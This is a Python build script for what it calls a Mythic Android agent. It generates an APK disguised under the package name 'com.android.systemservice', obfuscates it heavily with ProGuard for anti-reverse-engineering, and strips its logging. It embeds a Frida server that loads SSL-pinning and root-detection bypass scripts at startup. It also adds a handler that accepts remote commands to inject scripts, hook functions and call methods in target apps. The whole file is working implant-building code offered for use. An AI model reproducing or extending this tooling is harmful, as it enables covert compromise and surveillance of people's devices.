#!/usr/bin/env python3
"""
Enhanced APK Builder with ProGuard Integration and Embedded Frida Support
"""

import os
import sys
import json
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional
from build_apk import EnhancedAPKBuilder

class ProGuardIntegratedBuilder(EnhancedAPKBuilder):
    def __init__(self, build_params: Dict):
        super().__init__(build_params)
        self.proguard_enabled = build_params.get('enable_proguard', True)
        self.proguard_path = self._get_proguard_path()
        self.frida_embedded = build_params.get('embed_frida', True)
        
    def _get_proguard_path(self) -> Optional[str]:
        """Get ProGuard installation path"""
        deps_dir = Path(__file__).parent.parent / "dependencies"
        proguard_dir = deps_dir / "proguard" / "proguard-7.4.0"
        
        if proguard_dir.exists():
            if os.name == 'nt':  # Windows
                return str(proguard_dir / "bin" / "proguard.bat")
            else:  # Unix-like
                return str(proguard_dir / "bin" / "proguard.sh")
        
        # Check system PATH
        if shutil.which('proguard'):
            return 'proguard'
        
        print("[!] ProGuard not found - obfuscation will be limited")
        return None

    def build(self) -> str:
        """Enhanced build process with ProGuard integration"""
        try:
            print(f"[+] Building enhanced APK with ProGuard and embedded Frida...")
            print(f"[+] Campaign: {self.params.get('campaign_id', 'default')}")
            
            # Create enhanced project structure
            self._create_enhanced_project_structure()
            
            # Embed Frida assets if enabled
            if self.frida_embedded:
                self._embed_frida_assets()
            
            # Generate enhanced source code
            self._generate_enhanced_source_code()
            
            # Create enhanced manifest
            self._create_enhanced_manifest()
            
            # Add native components
            self._add_native_components()
            
            # Enhanced obfuscation (pre-ProGuard)
            if self.params.get('obfuscation_level', 'none') != 'none':
                self._apply_enhanced_obfuscation()
            
            # Compile APK
            apk_path = self._compile_enhanced_apk()
            
            # Apply ProGuard if available
            if self.proguard_enabled and self.proguard_path:
                apk_path = self._apply_proguard_obfuscation(apk_path)
            
            # Sign final APK
            signed_apk = self._sign_enhanced_apk(apk_path)
            
            print(f"[+] Enhanced APK built successfully: {signed_apk}")
            return signed_apk
            
        except Exception as e:
            print(f"[-] Enhanced build failed: {str(e)}")
            raise
        finally:
            self._cleanup()

    def _embed_frida_assets(self):
        """Embed Frida assets into APK"""
        print("[+] Embedding Frida assets...")
        
        assets_src = Path(__file__).parent.parent / "assets" / "frida-agents"
        assets_dst = self.project_dir / "src" / "main" / "assets" / "frida-agents"
        
        if assets_src.exists():
            if assets_dst.exists():
                shutil.rmtree(assets_dst)
            shutil.copytree(assets_src, assets_dst)
            print("[+] Frida assets embedded successfully")
        else:
            print("[!] Frida assets not found - run 'make create-frida-agent-assets' first")

    def _apply_proguard_obfuscation(self, input_apk: str) -> str:
        """Apply ProGuard obfuscation to compiled APK"""
        print("[+] Applying ProGuard obfuscation...")
        
        # Create ProGuard working directory
        proguard_work_dir = self.project_dir / "proguard_work"
        proguard_work_dir.mkdir(exist_ok=True)
        
        # Extract APK for ProGuard processing
        extracted_dir = proguard_work_dir / "extracted"
        self._extract_apk(input_apk, extracted_dir)
        
        # Create ProGuard configuration
        config_file = self._create_proguard_config(proguard_work_dir)
        
        # Run ProGuard
        obfuscated_jar = self._run_proguard(extracted_dir, proguard_work_dir, config_file)
        
        # Repackage APK
        output_apk = self._repackage_apk(input_apk, obfuscated_jar, proguard_work_dir)
        
        print("[+] ProGuard obfuscation completed")
        return output_apk

    def _extract_apk(self, apk_path: str, extract_dir: Path):
        """Extract APK for ProGuard processing"""
        extract_dir.mkdir(parents=True, exist_ok=True)
        
        # Use Android apktool or basic zip extraction
        try:
            cmd = ["unzip", "-q", apk_path, "-d", str(extract_dir)]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"APK extraction failed: {result.stderr}")
        except FileNotFoundError:
            # Fallback to Python zipfile if unzip not available
            import zipfile
            with zipfile.ZipFile(apk_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)

    def _create_proguard_config(self, work_dir: Path) -> str:
        """Create ProGuard configuration file"""
        config_content = f"""
# ProGuard configuration for Mythic Android Agent
-injars {work_dir}/extracted/classes.dex
-outjars {work_dir}/obfuscated/classes.dex
-libraryjars {self.platforms}/android.jar

# Basic obfuscation settings
-dontpreverify
-repackageclasses ''
-allowaccessmodification
-optimizations !code/simplification/advanced
-optimizationpasses 5

# Keep application components
-keep public class * extends android.app.Application {{
    *;
}}

-keep public class * extends android.app.Service {{
    *;
}}

-keep public class * extends android.content.BroadcastReceiver {{
    *;
}}

-keep public class * extends android.app.Activity {{
    *;
}}

# Keep native methods
-keepclasseswithmembernames,includedescriptorclasses class * {{
    native <methods>;
}}

# Keep Frida integration classes
-keep class com.android.systemservice.frida.** {{
    *;
}}

# Keep core agent classes
-keep class com.android.systemservice.CoreAgent {{
    *;
}}

-keep class com.android.systemservice.EnhancedMainService {{
    *;
}}

# Aggressive obfuscation for other classes
-keepclassmembers class * {{
    !private <fields>;
    !private <methods>;
}}

# Remove debug information
-assumenosideeffects class android.util.Log {{
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
}}

# String obfuscation
-adaptclassstrings
-adaptresourcefilenames **.properties,**.xml,**.txt,**.spec
-adaptresourcefilecontents **.properties,META-INF/MANIFEST.MF

# Control flow obfuscation
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*

# Custom naming
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable

# Anti-reverse engineering
-overloadaggressively
-mergeinterfacesaggressively
-flattenpackagehierarchy
"""

        config_file = work_dir / "proguard.cfg"
        config_file.write_text(config_content)
        return str(config_file)

    def _run_proguard(self, extracted_dir: Path, work_dir: Path, config_file: str) -> str:
        """Run ProGuard obfuscation"""
        obfuscated_dir = work_dir / "obfuscated"
        obfuscated_dir.mkdir(exist_ok=True)
        
        # Convert DEX to JAR for ProGuard
        classes_dex = extracted_dir / "classes.dex"
        classes_jar = work_dir / "classes.jar"
        
        self._dex_to_jar(classes_dex, classes_jar)
        
        # Update config to use JAR files
        updated_config = config_file.replace("classes.dex", "classes.jar")
        
        # Run ProGuard
        cmd = [
            self.proguard_path,
            f"@{updated_config}"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(work_dir))
            if result.returncode != 0:
                print(f"[!] ProGuard warning: {result.stderr}")
                # Continue even with warnings
        except Exception as e:
            print(f"[!] ProGuard execution failed: {e}")
            # Return original JAR if ProGuard fails
            return str(classes_jar)
        
        obfuscated_jar = obfuscated_dir / "classes.jar"
        return str(obfuscated_jar) if obfuscated_jar.exists() else str(classes_jar)

    def _dex_to_jar(self, dex_file: Path, jar_file: Path):
        """Convert DEX file to JAR for ProGuard processing"""
        try:
            # Use dex2jar if available
            dex2jar_cmd = shutil.which("d2j-dex2jar")
            if dex2jar_cmd:
                cmd = [dex2jar_cmd, str(dex_file), "-o", str(jar_file)]
                subprocess.run(cmd, check=True, capture_output=True)
                return
            
            # Fallback: use dx tool in reverse
            dx_tool = f"{self.build_tools}/dx"
            if Path(dx_tool).exists():
                cmd = [dx_tool, "--dex", "--output=" + str(jar_file), str(dex_file)]
                subprocess.run(cmd, check=True, capture_output=True)
                return
            
            # If no tools available, copy as-is (ProGuard might handle it)
            shutil.copy2(dex_file, jar_file)
            
        except Exception as e:
            print(f"[!] DEX to JAR conversion failed: {e}")
            # Copy original file as fallback
            if dex_file.exists():
                shutil.copy2(dex_file, jar_file)

    def _jar_to_dex(self, jar_file: Path, dex_file: Path):
        """Convert JAR file back to DEX format"""
        try:
            # Use d8 tool (preferred)
            d8_tool = f"{self.build_tools}/d8"
            if Path(d8_tool).exists():
                cmd = [
                    d8_tool,
                    "--release",
                    "--min-api", "21",
                    "--output", str(dex_file.parent),
                    str(jar_file)
                ]
                subprocess.run(cmd, check=True, capture_output=True)
                return
            
            # Fallback to dx
            dx_tool = f"{self.build_tools}/dx"
            if Path(dx_tool).exists():
                cmd = [
                    dx_tool,
                    "--dex",
                    "--output=" + str(dex_file),
                    str(jar_file)
                ]
                subprocess.run(cmd, check=True, capture_output=True)
                return
            
            # If no tools available, copy as-is
            shutil.copy2(jar_file, dex_file)
            
        except Exception as e:
            print(f"[!] JAR to DEX conversion failed: {e}")
            if jar_file.exists():
                shutil.copy2(jar_file, dex_file)

    def _repackage_apk(self, original_apk: str, obfuscated_jar: str, work_dir: Path) -> str:
        """Repackage APK with obfuscated code"""
        print("[+] Repackaging obfuscated APK...")
        
        # Convert obfuscated JAR back to DEX
        obfuscated_dex = work_dir / "classes.dex"
        self._jar_to_dex(Path(obfuscated_jar), obfuscated_dex)
        
        # Create new APK
        repackaged_apk = str(Path(original_apk).with_suffix('.obfuscated.apk'))
        
        # Copy original APK
        shutil.copy2(original_apk, repackaged_apk)
        
        # Replace classes.dex with obfuscated version
        if obfuscated_dex.exists():
            import zipfile
            with zipfile.ZipFile(repackaged_apk, 'a') as apk_zip:
                apk_zip.write(obfuscated_dex, 'classes.dex')
        
        return repackaged_apk

    def _generate_enhanced_source_code(self):
        """Generate enhanced source code with Frida integration"""
        print("[+] Generating enhanced source code with Frida support...")
        
        # Call parent method
        super()._generate_enhanced_source_code()
        
        # Add Frida-specific components
        self._generate_frida_integration_service()
        self._generate_multi_handler_frida_server()

    def _generate_frida_integration_service(self):
        """Generate Frida integration service"""
        java_package_dir = self.project_dir / "src/main/java/com/android/systemservice"
        
        frida_service_content = f'''package com.android.systemservice;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.util.Log;
import com.android.systemservice.frida.EmbeddedFridaManager;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.Map;

public class FridaIntegrationService extends Service {{
    private static final String TAG = "FridaService";
    
    private EmbeddedFridaManager fridaManager;
    private Map<String, String> activeScripts = new ConcurrentHashMap<>();
    private boolean fridaServerRunning = false;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        Log.d(TAG, "Frida integration service created");
        
        // Initialize Frida manager
        fridaManager = new EmbeddedFridaManager(this);
        
        // Start Frida server
        startFridaServer();
    }}
    
    private void startFridaServer() {{
        fridaManager.deployAndStartServer().thenAccept(success -> {{
            if (success) {{
                fridaServerRunning = true;
                Log.i(TAG, "Frida server started successfully");
                
                // Load default scripts
                loadDefaultScripts();
            }} else {{
                Log.e(TAG, "Failed to start Frida server");
            }}
        }});
    }}
    
    private void loadDefaultScripts() {{
        try {{
            // Load basic hooks script
            String basicHooks = loadScriptFromAssets("frida-agents/scripts/basic_hooks.js");
            if (basicHooks != null) {{
                executeScript("basic_hooks", basicHooks, getPackageName());
            }}
            
            // Load SSL bypass script
            String sslBypass = loadScriptFromAssets("frida-agents/scripts/ssl_bypass.js");
            if (sslBypass != null) {{
                executeScript("ssl_bypass", sslBypass, getPackageName());
            }}
            
            // Load root bypass script
            String rootBypass = loadScriptFromAssets("frida-agents/scripts/root_bypass.js");
            if (rootBypass != null) {{
                executeScript("root_bypass", rootBypass, getPackageName());
            }}
            
        }} catch (Exception e) {{
            Log.e(TAG, "Failed to load default scripts: " + e.getMessage());
        }}
    }}
    
    private String loadScriptFromAssets(String assetPath) {{
        try {{
            java.io.InputStream is = getAssets().open(assetPath);
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) != -1) {{
                baos.write(buffer, 0, length);
            }}
            is.close();
            
            return baos.toString();
        }} catch (Exception e) {{
            Log.e(TAG, "Failed to load script from assets: " + assetPath);
            return null;
        }}
    }}
    
    public void executeScript(String scriptName, String scriptContent, String targetPackage) {{
        if (!fridaServerRunning) {{
            Log.w(TAG, "Frida server not running, cannot execute script");
            return;
        }}
        
        fridaManager.executeScript(scriptContent, targetPackage).thenAccept(output -> {{
            Log.d(TAG, "Script executed: " + scriptName);
            Log.d(TAG, "Output: " + output);
            activeScripts.put(scriptName, targetPackage);
        }});
    }}
    
    public Map<String, String> getActiveScripts() {{
        return new ConcurrentHashMap<>(activeScripts);
    }}
    
    public boolean isFridaServerRunning() {{
        return fridaServerRunning && fridaManager.isServerRunning();
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return new FridaServiceBinder();
    }}
    
    public class FridaServiceBinder extends android.os.Binder {{
        public FridaIntegrationService getService() {{
            return FridaIntegrationService.this;
        }}
    }}
    
    @Override
    public void onDestroy() {{
        if (fridaManager != null) {{
            fridaManager.stopFridaServer();
        }}
        super.onDestroy();
    }}
}}'''
        
        service_path = java_package_dir / "FridaIntegrationService.java"
        service_path.write_text(frida_service_content)

    def _generate_multi_handler_frida_server(self):
        """Generate multi-handler Frida server management"""
        java_package_dir = self.project_dir / "src/main/java/com/android/systemservice"
        
        multi_handler_content = '''package com.android.systemservice;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import org.json.JSONArray;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.Map;
import java.util.List;
import java.util.ArrayList;

public class MultiFridaHandler {
    private static final String TAG = "MultiFridaHandler";
    private static MultiFridaHandler instance;
    
    private Context context;
    private FridaIntegrationService fridaService;
    private ExecutorService executorService;
    private Map<String, FridaSession> activeSessions = new ConcurrentHashMap<>();
    
    public static synchronized MultiFridaHandler getInstance(Context context) {
        if (instance == null) {
            instance = new MultiFridaHandler(context);
        }
        return instance;
    }
    
    private MultiFridaHandler(Context context) {
        this.context = context.getApplicationContext();
        this.executorService = Executors.newFixedThreadPool(5);
    }
    
    public void setFridaService(FridaIntegrationService service) {
        this.fridaService = service;
    }
    
    public CompletableFuture<JSONObject> handleFridaCommand(JSONObject command) {
        return CompletableFuture.supplyAsync(() -> {
            try {
                String action = command.getString("action");
                String sessionId = command.optString("session_id", "default");
                
                switch (action) {
                    case "create_session":
                        return createSession(command);
                    
                    case "execute_script":
                        return executeScript(sessionId, command);
                    
                    case "inject_script":
                        return injectScript(sessionId, command);
                    
                    case "list_processes":
                        return listProcesses();
                    
                    case "attach_process":
                        return attachToProcess(sessionId, command);
                    
                    case "detach_process":
                        return detachFromProcess(sessionId);
                    
                    case "get_sessions":
                        return getActiveSessions();
                    
                    case "hook_function":
                        return hookFunction(sessionId, command);
                    
                    case "call_function":
                        return callFunction(sessionId, command);
                    
                    default:
                        return createErrorResponse("Unknown action: " + action);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Frida command handling failed: " + e.getMessage());
                return createErrorResponse(e.getMessage());
            }
        }, executorService);
    }
    
    private JSONObject createSession(JSONObject command) {
        try {
            String sessionId = command.optString("session_id", generateSessionId());
            String targetPackage = command.optString("target_package", context.getPackageName());
            
            FridaSession session = new FridaSession(sessionId, targetPackage);
            activeSessions.put(sessionId, session);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("session_id", sessionId);
            result.put("target_package", targetPackage);
            result.put("message", "Session created successfully");
            
            Log.i(TAG, "Created Frida session: " + sessionId);
            return result;
            
        } catch (Exception e) {
            return createErrorResponse("Failed to create session: " + e.getMessage());
        }
    }
    
    private JSONObject executeScript(String sessionId, JSONObject command) {
        try {
            FridaSession session = activeSessions.get(sessionId);
            if (session == null) {
                return createErrorResponse("Session not found: " + sessionId);
            }
            
            String scriptContent = command.getString("script");
            String scriptName = command.optString("script_name", "inline_script");
            
            if (fridaService != null) {
                fridaService.executeScript(scriptName, scriptContent, session.getTargetPackage());
                
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("session_id", sessionId);
                result.put("script_name", scriptName);
                result.put("message", "Script executed successfully");
                
                return result;
            } else {
                return createErrorResponse("Frida service not available");
            }
            
        } catch (Exception e) {
            return createErrorResponse("Script execution failed: " + e.getMessage());
        }
    }
    
    private JSONObject injectScript(String sessionId, JSONObject command) {
        try {
            String predefinedScript = command.getString("predefined_script");
            String targetPackage = command.optString("target_package");
            
            FridaSession session = activeSessions.get(sessionId);
            if (session == null) {
                return createErrorResponse("Session not found: " + sessionId);
            }
            
            String scriptPath = "frida-agents/scripts/" + predefinedScript + ".js";
            String scriptContent = loadScriptFromAssets(scriptPath);
            
            if (scriptContent != null && fridaService != null) {
                String target = targetPackage != null ? targetPackage : session.getTargetPackage();
                fridaService.executeScript(predefinedScript, scriptContent, target);
                
                session.addScript(predefinedScript, target);
                
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("session_id", sessionId);
                result.put("script_name", predefinedScript);
                result.put("target_package", target);
                result.put("message", "Predefined script injected successfully");
                
                return result;
            } else {
                return createErrorResponse("Failed to load predefined script: " + predefinedScript);
            }
            
        } catch (Exception e) {
            return createErrorResponse("Script injection failed: " + e.getMessage());
        }
    }
    
    private JSONObject listProcesses() {
        try {
            // This would typically call frida-ps command
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("processes", new JSONArray());
            result.put("message", "Process listing requires root access");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse("Failed to list processes: " + e.getMessage());
        }
    }
    
    private JSONObject attachToProcess(String sessionId, JSONObject command) {
        try {
            String targetPackage = command.getString("target_package");
            
            FridaSession session = activeSessions.get(sessionId);
            if (session == null) {
                return createErrorResponse("Session not found: " + sessionId);
            }
            
            session.setTargetPackage(targetPackage);
            session.setAttached(true);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("session_id", sessionId);
            result.put("target_package", targetPackage);
            result.put("message", "Attached to process successfully");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse("Failed to attach to process: " + e.getMessage());
        }
    }
    
    private JSONObject detachFromProcess(String sessionId) {
        try {
            FridaSession session = activeSessions.get(sessionId);
            if (session == null) {
                return createErrorResponse("Session not found: " + sessionId);
            }
            
            session.setAttached(false);
            session.clearScripts();
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("session_id", sessionId);
            result.put("message", "Detached from process successfully");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse("Failed to detach from process: " + e.getMessage());
        }
    }
    
    private JSONObject getActiveSessions() {
        try {
            JSONObject result = new JSONObject();
            JSONArray sessions = new JSONArray();
            
            for (Map.Entry<String, FridaSession> entry : activeSessions.entrySet()) {
                JSONObject sessionInfo = new JSONObject();
                FridaSession session = entry.getValue();
                
                sessionInfo.put("session_id", entry.getKey());
                sessionInfo.put("target_package", session.getTargetPackage());
                sessionInfo.put("attached", session.isAttached());
                sessionInfo.put("active_scripts", session.getActiveScripts().size());
                sessionInfo.put("created_at", session.getCreatedAt());
                
                sessions.put(sessionInfo);
            }
            
            result.put("success", true);
            result.put("sessions", sessions);
            result.put("total_sessions", activeSessions.size());
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse("Failed to get active sessions: " + e.getMessage());
        }
    }
    
    private JSONObject hookFunction(String sessionId, JSONObject command) {
        try {
            String className = command.getString("class_name");
            String methodName = command.getString("method_name");
            String hookType = command.optString("hook_type", "before");
            
            // Generate dynamic hook script
            String hookScript = generateHookScript(className, methodName, hookType);
            
            // Execute hook script
            JSONObject scriptCommand = new JSONObject();
            scriptCommand.put("script", hookScript);
            scriptCommand.put("script_name", "hook_" + className + "_" + methodName);
            
            return executeScript(sessionId, scriptCommand);
            
        } catch (Exception e) {
            return createErrorResponse("Failed to hook function: " + e.getMessage());
        }
    }
    
    private JSONObject callFunction(String sessionId, JSONObject command) {
        try {
            String className = command.getString("class_name");
            String methodName = command.getString("method_name");
            JSONArray args = command.optJSONArray("arguments");
            
            // Generate function call script
            String callScript = generateCallScript(className, methodName, args);
            
            // Execute call script
            JSONObject scriptCommand = new JSONObject();
            scriptCommand.put("script", callScript);
            scriptCommand.put("script_name", "call_" + className + "_" + methodName);
            
            return executeScript(sessionId, scriptCommand);
            
        } catch (Exception e) {
            return createErrorResponse("Failed to call function: " + e.getMessage());
        }
    }
    
    private String loadScriptFromAssets(String assetPath) {
        try {
            java.io.InputStream is = context.getAssets().open(assetPath);
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) != -1) {
                baos.write(buffer, 0, length);
            }
            is.close();
            
            return baos.toString();
        } catch (Exception e) {
            Log.e(TAG, "Failed to load script from assets: " + assetPath);
            return null;
        }
    }
    
    private String generateHookScript(String className, String methodName, String hookType) {
        return String.format(
            "Java.perform(function() {\\n" +
            "    var targetClass = Java.use('%s');\\n" +
            "    targetClass.%s.implementation = function() {\\n" +
            "        console.log('[+] Hooked %s.%s called');\\n" +
            "        console.log('[+] Arguments: ' + JSON.stringify(arguments));\\n" +
            "        var result = this.%s.apply(this, arguments);\\n" +
            "        console.log('[+] Return value: ' + result);\\n" +
            "        return result;\\n" +
            "    };\\n" +
            "});", 
            className, methodName, className, methodName, methodName
        );
    }
    
    private String generateCallScript(String className, String methodName, JSONArray args) {
        StringBuilder argsStr = new StringBuilder();
        if (args != null) {
            for (int i = 0; i < args.length(); i++) {
                if (i > 0) argsStr.append(", ");
                try {
                    argsStr.append("'").append(args.getString(i)).append("'");
                } catch (Exception e) {
                    argsStr.append("null");
                }
            }
        }
        
        return String.format(
            "Java.perform(function() {\\n" +
            "    var targetClass = Java.use('%s');\\n" +
            "    var result = targetClass.%s(%s);\\n" +
            "    console.log('[+] Function call result: ' + result);\\n" +
            "});",
            className, methodName, argsStr.toString()
        );
    }
    
    private String generateSessionId() {
        return "frida_session_" + System.currentTimeMillis();
    }
    
    private JSONObject createErrorResponse(String error) {
        try {
            JSONObject result = new JSONObject();
            result.put("success", false);
            result.put("error", error);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Failed to create error response: " + e.getMessage());
            return new JSONObject();
        }
    }
    
    public void cleanup() {
        activeSessions.clear();
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdown();
        }
    }
    
    // Inner class to represent a Frida session
    private static class FridaSession {
        private String sessionId;
        private String targetPackage;
        private boolean attached;
        private Map<String, String> activeScripts;
        private long createdAt;
        
        public FridaSession(String sessionId, String targetPackage) {
            this.sessionId = sessionId;
            this.targetPackage = targetPackage;
            this.attached = false;
            this.activeScripts = new ConcurrentHashMap<>();
            this.createdAt = System.currentTimeMillis();
        }
        
        // Getters and setters
        public String getSessionId() { return sessionId; }
        public String getTargetPackage() { return targetPackage; }
        public void setTargetPackage(String targetPackage) { this.targetPackage = targetPackage; }
        public boolean isAttached() { return attached; }
        public void setAttached(boolean attached) { this.attached = attached; }
        public Map<String, String> getActiveScripts() { return activeScripts; }
        public long getCreatedAt() { return createdAt; }
        
        public void addScript(String scriptName, String targetPackage) {
            activeScripts.put(scriptName, targetPackage);
        }
        
        public void clearScripts() {
            activeScripts.clear();
        }
    }
}'''
        
        handler_path = java_package_dir / "MultiFridaHandler.java"
        handler_path.write_text(multi_handler_content)

def main():
    """Main function for enhanced build"""
    if len(sys.argv) < 2:
        print("Usage: python enhanced_build.py <config_file>")
        sys.exit(1)
    
    config_file = sys.argv[1]
    
    try:
        with open(config_file, 'r') as f:
            build_params = json.load(f)
    except Exception as e:
        print(f"Failed to load config file: {e}")
        sys.exit(1)
    
    # Create enhanced builder
    builder = ProGuardIntegratedBuilder(build_params)
    
    try:
        apk_path = builder.build()
        print(f"[+] Enhanced APK built successfully: {apk_path}")
    except Exception as e:
        print(f"[-] Build failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
